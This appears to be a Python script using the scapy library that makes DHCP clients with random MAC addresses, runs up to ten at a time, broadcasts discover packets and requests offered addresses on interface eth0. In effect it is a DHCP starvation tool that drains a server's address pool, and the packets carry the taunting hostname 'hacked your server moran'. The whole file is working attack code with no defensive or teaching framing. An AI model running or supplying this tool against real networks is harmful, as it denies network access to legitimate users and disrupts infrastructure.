from scapy.all import sniff,UDP,DHCP,BOOTP,IP,Ether,RandInt,RandMAC,srp1,sendp,DHCPRevOptions
from scapy.utils import mac2str
import random
from threading import Thread,get_ident 

import time 
class DHCPClient:
	aborted = -1 
	__onAir__=0  #mini lock to prevent more then 10 at a time 
	__count__=0	
	__dstPort__ = 67 
	__srcPort__ = 68 
	__BROADCASTMAC__ = "ff:ff:ff:ff:ff:ff"
	__BROADCASTIP__ = "255.255.255.255"
	def __init__(self) : 
		self.mac = str(RandMAC())
		self.ip = "0.0.0.0" 
		DHCPClient.__count__+=1
		self.time=None 
		self.name = DHCPClient.__count__ 
		self.server = {
			"mac" : None,  
			"ip" : None 
		}


	def __requestyou__(self,packet):
		print(f"req:  {packet.summary()} " )
		self.server["mac"] = packet[Ether].src
		self.server["ip"] = packet[IP].src 
		self.ip  = packet["IP"].dst
		print(f"IP : {self.ip }, name : {self.name}  ,thread :  {get_ident()}")
		Frame = Ether(src = self.mac , dst = self.server["mac"] ) 
		Datagram =IP(src = self.ip , dst = self.server["ip"] )
		Segment=UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp= BOOTP( chaddr=mac2str(self.mac) , xid = RandInt())
		DHCPPACK =DHCP(options = [
		('message-type','request'),
		('hostname','hacked your server moran ;)IDHM;) '),
		('requested_addr', self.ip),
		'end'])
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
		print("sending")
		ack = srp1(pack,iface='eth0')
		optionsAck = ack[DHCP].options 
		for i in optionsAck : 
			if i[0] == "lease_time":
				self.time  =time.time()  + i[1]
				break 
		print(f"ack {self.name }  : {self.time}/ { ack.summary()}") 
		DHCPClient.__onAir__-=1
	def __offerme__(self):
		pack = sniff(lfilter= lambda packet :
		Ether in packet 
		and packet[Ether].dst == self.mac 
		and  UDP in packet 
		and packet["UDP"].dport  == 68 ,
          	prn=self.__requestyou__,
          	count=1,timeout= 10 ) 
		print(f" pack : { self.name } : {pack } : { len(pack)}  ")
		if  len(pack) ==0   : 
			print(f"anonded {self.name}" ) 
			DHCPClient.aborted = self.name
		print(f"offerd ended : {self.name}") 

	def discover(self):  
		'''Discovers DHCP servers and starts connection process with them  '''
		while(DHCPClient.__onAir__ >= 10 ):
			if(DHCPClient.aborted != -1 ) :
				return 
		DHCPClient.__onAir__+=1 
		print(f"{self.name} : {self.mac}" )  
		Frame = Ether(dst = DHCPClient.__BROADCASTMAC__, src = self.mac) 
		Datagram = IP( dst = DHCPClient.__BROADCASTIP__, src= self.ip  ) 
		Segment = UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp = BOOTP(chaddr=mac2str(self.mac) , xid = RandInt()) 
		DHCPPACK = DHCP ( options = [
		('message-type','discover'),
		('hostname','hacked your server moran ;)IDHM;) '),
		'end'] )
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
	
		tr = Thread(target=self.__offerme__)
		tr.start()
		sendp(pack,iface='eth0')
		return tr 
		

